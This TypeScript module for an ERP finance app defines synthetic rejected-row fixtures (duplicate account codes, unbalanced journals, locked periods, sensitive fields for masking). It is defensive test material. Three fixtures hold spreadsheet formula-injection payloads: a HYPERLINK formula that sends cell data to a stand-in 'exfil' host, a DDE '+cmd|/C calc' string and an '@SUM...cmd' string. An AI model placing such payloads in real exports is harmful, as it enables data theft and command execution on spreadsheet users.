/**
 * ERP-4 Finance & Accounting — Web Rejection Context (KIT-16 / ERP4-23 / #179)
 *
 * Configures client-side module context for the shared RejectionReviewScreen.
 *
 * @module erp4/web/rejection-context
 */

import type { RejectedRow } from '@cs/kit';

export {
  erp4AccountsRejectionContext,
  erp4JournalEntriesRejectionContext,
  erp4FailureExplanations,
  ERP4_SENSITIVE_FIELDS,
} from '../../src/kit/rejection-context.js';

/**
 * Synthetic mock rejected rows for preview, simulator, and testing.
 * Contains 100% synthetic fixtures demonstrating:
 * - Duplicate Account Code error (BR-ERP4-01)
 * - Journal Entry Imbalance error (JOURNAL_UNBALANCED / BR-ERP4-01)
 * - Locked Period Posting error (PERIOD_LOCKED / BR-ERP4-02)
 * - Missing Mandatory Field error (RL-REQ-01)
 * - Sensitive financial / bank details (bank_account, salary, tax_id) that must be masked (AC3)
 * - Potential formula injection strings neutralized by formula-safe export (AC4)
 */
export const SYNTHETIC_ERP4_REJECTIONS: readonly RejectedRow[] = [
  {
    id: 'rej_acc_01',
    batchId: 'BATCH_ERP4_2026_01',
    sourceRow: 14,
    entity: 'accounts',
    errorCode: 'DUPLICATE_ACCOUNT_CODE',
    failureReason: 'Account code 1010-CASH already exists in active general ledger chart of accounts',
    field: 'code',
    createdAt: '2026-10-24T10:00:00Z',
    rawData: {
      code: '1010-CASH',
      name: 'Cash on Hand - Main Vault',
      source_id: 'ACC-8801',
      currency_code: 'INR',
      type: 'asset',
      description: 'Main operating petty cash vault',
      // Sensitive financial details in raw payload:
      bank_account: '987654321098',
      tax_id: 'PAN-FIN-9901',
      salary: 120000,
    },
  },
  {
    id: 'rej_acc_02',
    batchId: 'BATCH_ERP4_2026_01',
    sourceRow: 22,
    entity: 'accounts',
    errorCode: 'MISSING_REQUIRED_FIELD',
    failureReason: 'Required field "type" is missing or blank (ACC-003 / RL-REQ-01)',
    field: 'type',
    createdAt: '2026-10-24T10:00:00Z',
    rawData: {
      code: '9000-SUSP',
      name: 'Suspense Account',
      source_id: 'ACC-8802',
      currency_code: 'INR',
      type: '',
      description: 'Temporary unclassified clearing account',
    },
  },
  {
    id: 'rej_je_01',
    batchId: 'BATCH_ERP4_2026_01',
    sourceRow: 45,
    entity: 'journal_entries',
    errorCode: 'JOURNAL_UNBALANCED',
    failureReason: 'Total debits (150000.0000) do not equal total credits (145000.0000) — difference 5000.0000',
    field: 'lines',
    createdAt: '2026-10-24T10:05:00Z',
    rawData: {
      entry_number: 'JE-2026-045',
      period_id: '2026-04',
      source_id: 'JE-SRC-045',
      currency_code: 'INR',
      posting_date: '2026-04-15',
      description: 'Vendor invoice payment batch #45',
      // Formula injection test vector in raw notes
      notes: '=HYPERLINK("http://malicious.synthetic/exfil?d=" & A1, "Click to Audit")',
    },
  },
  {
    id: 'rej_je_02',
    batchId: 'BATCH_ERP4_2026_01',
    sourceRow: 78,
    entity: 'journal_entries',
    errorCode: 'PERIOD_LOCKED',
    failureReason: 'Fiscal period 2026-03 is locked against new journal postings (BR-ERP4-02)',
    field: 'period_id',
    createdAt: '2026-10-24T10:10:00Z',
    rawData: {
      entry_number: 'JE-2026-078',
      period_id: '2026-03',
      source_id: 'JE-SRC-078',
      currency_code: 'INR',
      posting_date: '2026-03-31',
      description: 'Late adjustment entry for FY cutover',
      // Formula injection test vector starting with +
      notes: '+cmd|/C calc!A0',
    },
  },
  {
    id: 'rej_acc_03',
    batchId: 'BATCH_ERP4_2026_01',
    sourceRow: 99,
    entity: 'accounts',
    errorCode: 'INVALID_CURRENCY',
    failureReason: 'Currency code "INDIAN_RUPEE" does not conform to 3-letter ISO-4217 standard (ACC-004)',
    field: 'currency_code',
    createdAt: '2026-10-24T10:15:00Z',
    rawData: {
      code: '4010-SALES',
      name: 'Product Sales Domestic',
      source_id: 'ACC-8803',
      currency_code: 'INDIAN_RUPEE',
      type: 'income',
      // Formula injection test vector starting with @
      description: '@SUM(1+1)*cmd',
    },
  },
];
